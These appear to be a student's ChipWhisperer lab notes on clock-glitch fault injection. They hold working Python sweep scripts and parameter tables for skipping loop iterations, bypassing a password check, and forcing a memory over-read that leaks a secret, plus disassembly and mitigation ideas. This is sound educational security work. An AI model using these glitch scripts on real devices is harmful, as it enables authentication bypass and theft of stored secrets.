## Basics
A microcontroller has a clock, like a metronome for the program. 
![[Screenshot 2023-06-13 at 2.42.11 PM.png]]

We can inject a very short voltage spike signal into the clock that will register as an edge, but wont provide enough time to actually complete the instruction. ![[Screenshot 2023-06-27 at 1.54.35 PM.png]]
This is useful for skipping security checks.

## Clock Circuits
- memory takes an input signal and a clock signal, it generates an output signal.
- ![[Screenshot 2023-06-28 at 10.07.51 PM.png]]
- and-gate that waits for the clock signal to complete its operation

## Other Important Info on general fault injection teqniques

- We want to look for fault primitives: consistent changes of behavior when the glitch is at a certain frequency, placed in a certain location in the program.
	- ex: skipping a loop so a count is 0xfe instead of 0xff and the conditions of the glitch controller that allow this to happen.
	- In a real life example, you will want to find the
- In practice, Fault Injection involves a lot of brute-forcing. Resetting and trying again 
- Diagram of fault injection:

![[Screenshot 2023-06-27 at 1.55.43 PM.png]]

- those operations over a period of time
![[Screenshot 2023-06-28 at 6.50.48 PM.png]]
- Is it necessary that the chipwhisperer clock is in sync with the system clock.
## Hardware
![[Screenshot 2023-06-13 at 2.48.56 PM.png]]

*note: these tutorials are mainly focused on teaching concepts of glitching. In order to actually have to figure out *
## Settings
to glitch and collect the feedback, create a `glitch.GlitchController`

`offset`: where in the output clock to place the glitch
`width`: width of the glitches
`clk_src`: the source of the clock signal(input). can either be "target"(use target clock) or "clkgen"(use chipwhisperer clock). 
`trigger_src`: the event to start the clock glitch
`ext_offset`: number of cycles after the trigger to put the glitch (for precision)
`repeat`: number of clock cycles to repeat the glitch for

How do we configure the chipwhisperer to match the clock on the target device?
#### Basic Setup (for Lab 1)
```
clk_src     = clkgen
width       = 10.15625
width_fine  = 0
offset      = 10.15625
offset_fine = 0
trigger_src = ext_single
arm_timing  = after_scope
ext_offset  = 0
repeat      = 1
output      = clock_xor
```

### Lab 1.1 Task
```C
uint8_t glitch_loop(uint8_t* in)
{
    volatile uint16_t i, j;
    volatile uint32_t cnt;
    cnt = 0;
    trigger_high();
    for(i=0; i<50; i++){
        for(j=0; j<50; j++){
            cnt++;
        }
    }
    trigger_low();
    simpleserial_put('r', 4, (uint8_t*)&cnt);
    return (cnt != 2500);
}
```
- glitch a double loop for loop (each loop runs 50 times) to change the count value from 2500 to a lower number (possibly 0!)
## Good Offset/Width pairings to use

| Offset | Width |
| ------ | ----- |
| 40     | 8     |
| -2     | 22    |
| -2     | 42    |
| -2     | 5     |
|        |       |

![[Screenshot 2023-06-30 at 9.53.44 AM.png]]


### Ways to control varying parameters
- `set_range` - controls the range that a given parameter will cycle through
- `set_step` - controls the increments that a given parameter steps through its range. Can be specified as a single valuem or an array of values. If an array is specified, it will loop through the range with each step value.
- `set_global_step` - like set_step for all parameters
- `sample_size` - 

### CW Code
```python
import chipwhisperer.common.results.glitch as glitch
from tqdm.notebook import trange
import struct

scope.glitch.ext_offset = 2

gc.set_range("width", 0, 48)
gc.set_range("offset", -48, 48)
gc.set_global_step([8, 4])

scope.glitch.repeat = 10

scope.adc.timeout = 0.1

reboot_flush()

for glitch_setting in gc.glitch_values():
    
    # optional: you can speed up the loop by checking if the trigger never went low
    #           (the target never called trigger_low();) via scope.adc.state
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.width = glitch_setting[0]
    
    print(f'offset: {glitch_setting[1]}')
    print(f'width: {glitch_setting[0]}')
    scope.arm()
    
    target.simpleserial_write("g", bytearray([]))
    
    ret = scope.capture()
    
    val = target.simpleserial_read_witherrors('r', 4, glitch_timeout=10)#For loop check
    
    print(val)
    
    # ###################
    # Add your code here
    # ###################
    invalid_response = False
    if not val['valid']:
        invalid_response = True
    
    
    if ret: #here the trigger never went high - sometimes the target is still crashed from a previous glitch
        print('Timeout - no trigger')
        gc.add("reset", (scope.glitch.width, scope.glitch.offset))
        plt.plot(scope.glitch.width, scope.glitch.offset, 'xr', alpha=1)
        fig.canvas.draw()

        #Device is slow to boot?
        reboot_flush()
    else:
        if invalid_response: # change this to detect an invalid response
            gc.add("reset", (scope.glitch.width, scope.glitch.offset))
            plt.plot(scope.glitch.width, scope.glitch.offset, 'xr', alpha=1)
            fig.canvas.draw()
        else:
            # gcnt is the loop counter
            gcnt = struct.unpack("<I", val['payload'])[0]
            print(gcnt)
            
            if gcnt == 2500: #normal response
                gc.add("normal", (scope.glitch.width, scope.glitch.offset))
            else: #glitch!!!
                gc.add("success", (scope.glitch.width, scope.glitch.offset))
```

### decompiled code
```c
08000258 <glitch_loop>:
#if SS_VER == SS_VER_2_1
uint8_t glitch_loop(uint8_t cmd, uint8_t scmd, uint8_t len, uint8_t* in)
#else
uint8_t glitch_loop(uint8_t* in, uint8_t len)
#endif
{
 8000258:	b513      	push	{r0, r1, r4, lr}
    volatile uint16_t i, j;
    volatile uint32_t cnt;
    cnt = 0;
 800025a:	2400      	movs	r4, #0
 800025c:	9401      	str	r4, [sp, #4]
    trigger_high();
 800025e:	f000 faed 	bl	800083c <trigger_high>
    for(i=0; i<50; i++){
 8000262:	f8ad 4000 	strh.w	r4, [sp]
 8000266:	f8bd 3000 	ldrh.w	r3, [sp]
 800026a:	2b31      	cmp	r3, #49	; 0x31
 800026c:	d90e      	bls.n	800028c <glitch_loop+0x34>
        for(j=0; j<50; j++){
            cnt++;
        }
    }
    trigger_low();
 800026e:	f000 faec 	bl	800084a <trigger_low>
    simpleserial_put('r', 4, (uint8_t*)&cnt);
 8000272:	aa01      	add	r2, sp, #4
 8000274:	2104      	movs	r1, #4
 8000276:	2072      	movs	r0, #114	; 0x72
 8000278:	f000 f984 	bl	8000584 <simpleserial_put>
#if SS_VER == SS_VER_2_1
    return (cnt != 2500) ? 0x10 : 0x00;
#else
    return (cnt != 2500);
 800027c:	9801      	ldr	r0, [sp, #4]
#endif
}
 800027e:	f640 13c4 	movw	r3, #2500	; 0x9c4
 8000282:	1ac0      	subs	r0, r0, r3
 8000284:	bf18      	it	ne
 8000286:	2001      	movne	r0, #1
 8000288:	b002      	add	sp, #8
 800028a:	bd10      	pop	{r4, pc}
        for(j=0; j<50; j++){
 800028c:	f8ad 4002 	strh.w	r4, [sp, #2]
 8000290:	f8bd 3002 	ldrh.w	r3, [sp, #2]
 8000294:	2b31      	cmp	r3, #49	; 0x31
 8000296:	d906      	bls.n	80002a6 <glitch_loop+0x4e>
    for(i=0; i<50; i++){
 8000298:	f8bd 3000 	ldrh.w	r3, [sp]
 800029c:	3301      	adds	r3, #1
 800029e:	b29b      	uxth	r3, r3
 80002a0:	f8ad 3000 	strh.w	r3, [sp]
 80002a4:	e7df      	b.n	8000266 <glitch_loop+0xe>
            cnt++;
 80002a6:	9b01      	ldr	r3, [sp, #4]
 80002a8:	3301      	adds	r3, #1
 80002aa:	9301      	str	r3, [sp, #4]
        for(j=0; j<50; j++){
 80002ac:	f8bd 3002 	ldrh.w	r3, [sp, #2]
 80002b0:	3301      	adds	r3, #1
 80002b2:	b29b      	uxth	r3, r3
 80002b4:	f8ad 3002 	strh.w	r3, [sp, #2]
 80002b8:	e7ea      	b.n	8000290 <glitch_loop+0x38>
```
# Lab 1.2
- glitch a password!
```c
uint8_t password(uint8_t* pw)
{
    char passwd[] = "touch";
    char passok = 1;
    int cnt;

    trigger_high();

    //Simple test - doesn't check for too-long password!
    for(cnt = 0; cnt < 5; cnt++){
        if (pw[cnt] != passwd[cnt]){
            passok = 0;
        }
    }

    trigger_low();

    simpleserial_put('r', 1, (uint8_t*)&passok);
    return passok;
}
```
O(n) compare - can glitch each individual check for the letter
- 5 character password

#### First 3 characters correct
- 28 successful glitches

| Offset | Width | ext_offset |
| ------ | ----- | ---------- |
| -8     | 4     | 17         |
| -8     | 4     | 27         |
| 4      | 4     | 17         |
| 4      | 4     | 27         |
| -4     | 8     | 17         |
| -4     | 8     | 27         |
| 0      | 8     | 17         |
| 0      | 8     | 27         |

settings
```
gc.set_range("width", 4, 8)
gc.set_range("offset", -8, 4)
gc.set_range("ext_offset", 11, 31)
```
#### First 2 characters correct
- only 17 `ext_offset` works, no 27
- 15 successful glitches

- does not work with only one character
```python
scope.glitch.clk_src = 'clkgen'
scope.glitch.trigger_src = 'ext_single'
scope.glitch.repeat = 1
scope.glitch.output = "clock_xor"
scope.io.hs2 = "glitch"
```

```python
import matplotlib.pylab as plt
import chipwhisperer.common.results.glitch as glitch
gc = glitch.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
gc.display_stats()
```

```python
from importlib import reload
import chipwhisperer.common.results.glitch as glitch
from tqdm.notebook import tqdm
import re
import struct
sample_size = 1
# These width/offset settings are for CW-Lite/Pro; width/offset are expressed differently for Husky (see Fault 1_1)
gc.set_range("width", 2, 14)
gc.set_range("offset", 0.4, 14)
gc.set_range("ext_offset", 0, 41)

step = 0.4
gc.set_global_step(step)
scope.glitch.repeat = 1
reboot_flush()
broken = False



for glitch_settings in gc.glitch_values():
    scope.glitch.offset = glitch_settings[1]
    scope.glitch.width = glitch_settings[0]
    scope.glitch.ext_offset = glitch_settings[2]
    for i in range(sample_size):
        if scope.adc.state:
            # can detect crash here (fast) before timing out (slow)
            print("Trigger still high!")
            gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
            #plt.plot(lwid, loff, 'xr', alpha=1)
            #fig.canvas.draw()

            #Device is slow to boot?
            reboot_flush()

        scope.arm()
        target.simpleserial_write('p', bytearray([0]*5))

        ret = scope.capture()


        if ret:
            print('Timeout - no trigger')
            gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))

            #Device is slow to boot?
            reboot_flush()

        else:
            val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50)#For loop check
            if val['valid'] is False:
                gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
                #plt.plot(scope.glitch.width, scope.glitch.offset, 'xr', alpha=1)
                #fig.canvas.draw()
            else:

                if val['payload'] == bytearray([1]): #for loop check
                    broken = True
                    gc.add("success", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
                    print(val['payload'])
                    print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)
                    print("🐙", end="")
                    break
                else:
                    gc.add("normal", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
    if broken:
        break
```
- What instruction is the glitch actually interrupting? Only one glitch is inserted but it appears to pass the for-loop 1 


- this one is probably difficult to glitch because it checks if the for-loop should continue after the first char is checked.

### Glitching with no correct characters
- set the global step value to a very small number (>1) and use those settings to find the glitch location

Glitch
```
1:
width: 2.34375 
offset: 1.171875 
ext_offset: 10

2:
width: 2.34375 
offset: 1.171875 
ext_offset: 9

more:

width offset ext_offset
2.34375 1.171875 5

2.34375 1.171875 5

2.34375 1.171875 44

2.34375 1.171875 44

2.34375 1.171875 48

2.34375 1.171875 48


```

I determined the number of samples collected between `trigger_high` and `trigger_low` using an attribute of the scope class: `scope.adc.trig_count`. While I don't think this is a representation of the total amount of clock cycles between trigger_high and trigger_low, this is useful because it can give us an idea of where in the program the glitch is occurring when we compare it to the ext_offset. This had a value ranging from 280-284 when I ran it. This means that the successful glitch (with an ext_offset of 10) is likely one of the first instructions in the program. 

I don't think that skipping the instruction where `i` is initialized would give us a successful glitch, because, in the assembly, the condition to exit the do-while loop to check the password is that `i` is not equal to the length of the password, instead of less than. The loop will only exit if `i` is equal to 5. However, I don't really see what else it could be, so the glitch could be successful because the memory where `i` would be initialized contains the right value. There are some other possibilities, such as skipping the section that checks if the loop should exit, but that would also require the if-statement that checks if the `i`th chars in the given and correct password are the same, and we know we are only preforming one glitch since the repeat parameter is set to 1.

Also, I ran another set of glitches with an `ext_offset` range of 0-284 with the same `width` and `offset` values. I found some glitches at 47 and 48. I think these could be skipping that final if_statement that checks if the temporary password_wrong variable is true and skipping the part where the variable that is actually returned, `passok`, is actually set to false.

Edit: The instruction that the original glitch is probably skipping is the `itt ne`, an instruction that acts as a conditional

`print(scope.adc.trig_count)`: 284
since the ext_offset is low, this is probably one of the 

```
# Lab 1.3
### The situation
*Taken from the chipwhisperer documentation*
1. The `p` command is used to write encrypted firmware to the device. It takes in an encrypted ASCII-encoded string, terminated with a newline. Our first chunk of firmware is `516261276720736265747267206762206f686c207a76797821`.
2. It does _something_ to it (presumably unencrypts it, authenticates it, etc. and writes it to memory)
3. It sends back an error code of `r000000\n`

### New things in this section
- we are not given the code we are trying to attack. Instead we have to gain information about its behavior through other means
- We don't have a defined success or failure to search for. We will have to get creative when detecting failures and successes


1. Devising behavior
We can capture a power trace and look at behavior that way.
![[Screenshot 2023-06-27 at 11.58.11 AM.png]]

```python
scope.arm()
#scope.adc.decimate = 2 #uncomment me if you need to decimate trace
target.write("p516261276720736265747267206762206f686c207a76797821\n")
ret = scope.capture()
if ret:
    print("Timeout")
trace = scope.get_last_trace()

%matplotlib inline
import matplotlib.pyplot as plt
plt.figure()
plt.plot(trace)
plt.show
```

This graph indicates it is probably looping through something (hopefully printing out characters so we can do a memory over-read)

you can also get the time between `trigger_high()` and `trigger_low` to get an approximation of the length of each loop.
```python
print(scope.adc.trig_count)
```
This is 9641.
- using the `offset_ext` parameter, we can control where in the loop we put the glitch
- We want to put the glitch towards the end of the loop
The range we use
```python
glitch_spots = [i for i in range(9341, 9641, 1)]
```
about 300 potential glitching a spots


`glitching code`
```python
from importlib import reload
import chipwhisperer.common.results.glitch as glitch
from tqdm.notebook import tqdm
import re
import struct

# replace with good glitch settings you've found
gc.set_range("width", 4, 8)
gc.set_range("offset", -8, 4)

step = 2
gc.set_global_step(step)
scope.glitch.repeat = 4

    
for glitch_setting in gc.glitch_values():
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.width = glitch_setting[0]
    for i in tqdm(glitch_spots, leave=False):
        scope.glitch.ext_offset = i
        if scope.adc.state:
            #print("Timeout, trigger still high!")
            gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
            plt.plot(scope.glitch.width, scope.glitch.ext_offset, 'xr', alpha=1)
            fig.canvas.draw()

            #Device is slow to boot?
            reboot_flush()
        
        target.flush()
        scope.arm()
        target.write("p516261276720736265747267206762206f686c207a76797821\n")
        ret = scope.capture()
        if ret:
            #print('Timeout - no trigger')
            gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
            plt.plot(scope.glitch.width, scope.glitch.ext_offset, 'xr', alpha=1)
            fig.canvas.draw()

            #Device is slow to boot?
            reboot_flush()
        else:
            time.sleep(0.05)
            output = target.read(timeout=2)
            if ("7821" in output) or ("p" in output): # HINT: look for some of what we sent over
                print("Glitched!\n\tExt offset: {}\n\tOffset: {}\n\tWidth: {}".format(i, scope.glitch.offset, scope.glitch.width))
                plt.plot(scope.glitch.width, scope.glitch.offset, '+g')
                gc.add("success", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
                fig.canvas.draw()
                broken = True 
                for __ in range(500): # dump memory
                    num_char = target.in_waiting()
                    if num_char:
                        my_print(output)
                        output = target.read(timeout=50)
                time.sleep(1)
                break
            else:
                gc.add("normal", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
```

### Defining success and failure
- if the i variable is glitched to part of the text we inputted, then it will print that out. Check to see if the output contains part of the input string (I check for the last 4 characters in this case: "7821")

### Result


	Ext offset: 9625
	Offset: -7.8125 (~-8)
	Width: 3.90625 (~4)

**output**
```
6720736265747267206762206f686c207a767978210x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00Don't forget to buy milk!0x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00
```
Secret Leaked: Don't forget to buy milk!

What if the secret isn't a recognizable, english phrase (but an actual cryptographic key)?
- it should be surrounded by null bytes
- or not, sometimes its hard to tell

### What is being Glitched
```c
void decrypt_data(uint8_t* buffer, uint8_t len)
{
 800032c:	b5f0      	push	{r4, r5, r6, r7, lr}
	// Apply rot-13 to each byte
	int i, j;
	for(i = 0; i < len; i++)
	{
		// Search for character inside input array
		for(j = 0; j < num_chars; j++)
 800032e:	4c0a      	ldr	r4, [pc, #40]	; (8000358 <decrypt_data+0x2c>)
 8000330:	4401      	add	r1, r0
	for(i = 0; i < len; i++)
 8000332:	4288      	cmp	r0, r1
 8000334:	d00f      	beq.n	8000356 <decrypt_data+0x2a>
		for(j = 0; j < num_chars; j++)
 8000336:	6ba5      	ldr	r5, [r4, #56]	; 0x38
 8000338:	4a08      	ldr	r2, [pc, #32]	; (800035c <decrypt_data+0x30>)
 800033a:	2300      	movs	r3, #0
 800033c:	e000      	b.n	8000340 <decrypt_data+0x14>
 800033e:	3301      	adds	r3, #1
 8000340:	429d      	cmp	r5, r3
 8000342:	dd06      	ble.n	8000352 <decrypt_data+0x26>
		{
			if(buffer[i] == input[j])
 8000344:	f812 6b01 	ldrb.w	r6, [r2], #1
 8000348:	7807      	ldrb	r7, [r0, #0]
 800034a:	42b7      	cmp	r7, r6
 800034c:	d1f7      	bne.n	800033e <decrypt_data+0x12>
			{
				buffer[i] = output[j];
 800034e:	5ce3      	ldrb	r3, [r4, r3]
 8000350:	7003      	strb	r3, [r0, #0]
				break;
 8000352:	3001      	adds	r0, #1
 8000354:	e7ed      	b.n	8000332 <decrypt_data+0x6>
			}
		}
	}
}
8000356:	bdf0      	pop	{r4, r5, r6, r7, pc}
8000358:	20000000 	.word	0x20000000
800035c:	2000003c 	.word	0x2000003c
```
- if we bypass the `cmp	r0, r1` instruction at `8000332`, we can skip the loop entirely.

- issue: code does not actually check `i < ascii_idx`. That was optimized away to check if `i != ascii_idx` 
	- if the last `i < ascii_idx` is skipped, then the loop will go on infinitely, printing the next thing in memory!

### Possible ways of mitigating this in your code

code
```C
trigger_high();

int i;
for(i = 0; i < ascii_idx; i++)
{
    putch(ascii_buffer[i]);
}
trigger_low();
state = IDLE;
```
- we probably corrupted i to be a large negative number
	- make i a volatile variable, which indicates it may change between accesses. makes sure checks don't get compiled out!
	- unroll the loop, since this instance always prints 7 chars
```C
int i;
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
```

- check for invalid characters so it only prints characters in the error code newlines, r and digits 0-9

# Some Advice for Glitching
- sometimes the only way to find a glitch is to let it run, even if it takes multiple hours.
- Looking at the assembly code is very helpful because it allows you to see which instructions were compiled and the actual control flow of the program
- You can even look at all of the cycle times. There is a document with a table that has the number of cycles each instruction takes for ARM assembly.
